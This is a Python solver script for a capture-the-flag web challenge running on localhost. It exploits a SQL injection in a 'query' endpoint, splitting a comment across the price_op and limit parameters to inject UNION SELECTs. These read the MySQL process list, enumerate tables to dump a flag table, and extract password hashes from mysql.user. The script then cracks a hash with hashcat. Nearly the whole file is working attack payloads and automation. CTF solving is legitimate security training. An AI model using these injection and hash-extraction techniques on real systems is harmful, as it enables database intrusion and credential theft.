import os
import re
import requests
import subprocess
import sys
import tempfile


BASE_CHAL_URL = os.getenv('BASE_CHAL_URL') or 'http://localhost:40000/'

# be defensive
if not BASE_CHAL_URL.endswith('/'):
    BASE_CHAL_URL += '/'

# print('BASE_CHAL_URL:', BASE_CHAL_URL)

def solve_flag1():
    url = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20INFO,1,2,3%20from%20INFORMATION_SCHEMA.PROCESSLIST'
    result = requests.get(url)

    if result.status_code != 200:
        print(f'unexpected response code: {result.status_code}, failed to solve flag1')
        return False
    
    if 'wctf{' not in result.text:
        print('flag not found in query result, failed to solve flag1')
        return False
    
    print('*** SOLVED Limited FLAG1')
    return True


def solve_flag2():
    url1 = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20table_name,1,2,3%20from%20INFORMATION_SCHEMA.tables'
    result = requests.get(url1)

    if result.status_code != 200:
        print(f'unexpected response code in url1: {result.status_code}, failed to solve flag2')
        return False

    # print(result.text)
    match = re.search(r'"(Flag_\w+)"', result.text)
    if not match:
        print('failed to find flag table name, failed to solve flag2')
        return False

    flag_table = match.group(1)
    # print('flag_table:', flag_table)
    url2 = BASE_CHAL_URL + f'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20select%20value,1,2,3%20from%20{flag_table}'
    result = requests.get(url2)

    if result.status_code != 200:
        print(f'unexpected response code in url2: {result.status_code}, failed to solve flag2')
        return False
    
    if 'wctf{' not in result.text:
        print('flag not found in url2 query result, failed to solve flag2')
        return False

    print('*** SOLVED Limited FLAG2')
    return True


def solve_flag3():
    url = BASE_CHAL_URL + 'query?price=10.99&price_op=%3E/*&limit=*/100%20union%20SELECT%20User,%20CONCAT(%27$mysql%27,LEFT(authentication_string,6),%27*%27,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,%27*%27))%20AS%20hash,%20plugin,4%20FROM%20mysql.user'
    result = requests.get(url)

    if result.status_code != 200:
        print(f'unexpected response code: {result.status_code}, failed to solve flag3')
        return False
    
    match = re.search(r'"flag","description":"4","name":"([^"]+)"', result.text)
    if not match:
        print('failed to find flag password hash, failed to solve flag3')
        return False
    
    flag_hash = match.group(1)
    # print('flag_hash:', flag_hash)
    print('Cracking hash, will take a minute...')

    file = tempfile.NamedTemporaryFile(delete = False)
    file.write(flag_hash.encode())
    file.close()
    hashfile_path = file.name

    wordlist_path = os.path.dirname(os.path.realpath(__file__)) + '/hashcat_wordlist.txt'

    # assumes you have hashcat installed!
    cmd = f'hashcat -m 7401 -a 0 --potfile-disable -O {hashfile_path} {wordlist_path}'
    # print(cmd)
    output = subprocess.check_output(cmd, shell = True, text = True)
    # print(output)

    # done with the hash file
    os.remove(hashfile_path)

    if flag_hash not in output:
        print('failed to crack password hash, failed to solve flag3')
        return False

    print('*** SOLVED Limited FLAG3')
    return True


f1 = solve_flag1()
f2 = solve_flag2()
f3 = solve_flag3()

if f1 and f2 and f3:
    sys.exit(0)

sys.exit(1)